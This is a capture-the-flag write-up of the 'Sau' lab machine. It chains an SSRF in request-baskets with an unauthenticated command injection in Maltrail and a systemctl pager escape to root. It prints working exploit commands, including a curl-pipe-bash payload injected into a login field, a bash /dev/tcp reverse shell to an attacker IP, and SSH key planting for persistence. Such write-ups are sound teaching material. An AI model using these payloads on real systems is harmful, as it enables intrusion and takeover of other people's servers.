## the box

Sau is an Ubuntu 20.04 box with OpenSSH 8.2p1 on 22, and ports 80 and 8338 filtered by a host firewall. The only thing I could reach was an unknown service on 55555.

## recon

nmap flagged 22 open and 80/8338 filtered. The 55555 fingerprint leaked the basket name pattern in an error string, and the root path redirected to `/web`:

```
55555/tcp open  unknown
Location: /web
invalid basket name; the name does not match pattern: ^[\w\d\-_\.]{1,250}$
```

The footer at `http://10.10.11.224:55555/web` named the software:

```
Powered by request-baskets | Version: 1.2.1
```

request-baskets 1.2.1 is vulnerable to SSRF via the `forward_url` field (CVE-2023-27163). A basket forwards incoming requests to a URL of my choosing, and with `proxy_response` set the forwarded response comes back to me. That reaches the filtered internal ports.

## foothold

I created a basket pointed at the internal web service on `127.0.0.1:80`:

```bash
curl --location 'http://sau.htb:55555/api/baskets/lkwa' \
  --header 'Content-Type: application/json' \
  --data '{"forward_url": "http://127.0.0.1:80/","proxy_response": true,"insecure_tls": false,"expand_path": true,"capacity": 250}'
```

Hitting the basket returned the internal service banner:

```
Powered by Maltrail (v0.53)
```

Maltrail 0.53 has an unauthenticated OS command injection in the login form. The `username` parameter is dropped into a subprocess unsanitized, so backticks execute. I hosted a reverse shell script and triggered it through the basket:

```bash
curl "http://10.10.11.224:55555/lkwa" \
  --data 'username=;`curl http://10.10.16.27:80/shell | bash`'
```

`shell` was a one-liner back to my listener:

```bash
bash -i >& /dev/tcp/10.10.16.27/8888 0>&1
```

That landed a shell as `puma`, who owned the user flag.

## user

The command injection ran as `puma` directly, so user access and foothold were the same step. I dropped my SSH key into `~/.ssh/authorized_keys` for a stable session:

```bash
echo 'ssh-rsa AAAA... uncle_j4ck@Farm' >> authorized_keys
ssh puma@sau.htb
```

## root

`sudo -l` showed one NOPASSWD command:

```
User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

`systemctl status` pipes its output through `less` when the output is longer than the terminal. less runs as root here, and less lets you spawn a shell with `!`. Running the command, then typing `!sh` at the pager prompt, gave a root shell:

```
puma@sau:~$ sudo /usr/bin/systemctl status trail.service
...
!sh
#
```

That dropped me to root and the root flag.

## takeaway

The whole chain starts with one outdated dependency reachable from the internet. request-baskets SSRF bridged the filtered ports, Maltrail's injection turned a banner into code execution, and the root step is the classic GTFOBins systemctl pager escape. Pinning sudo to `systemctl status` does nothing when the pager is interactive.
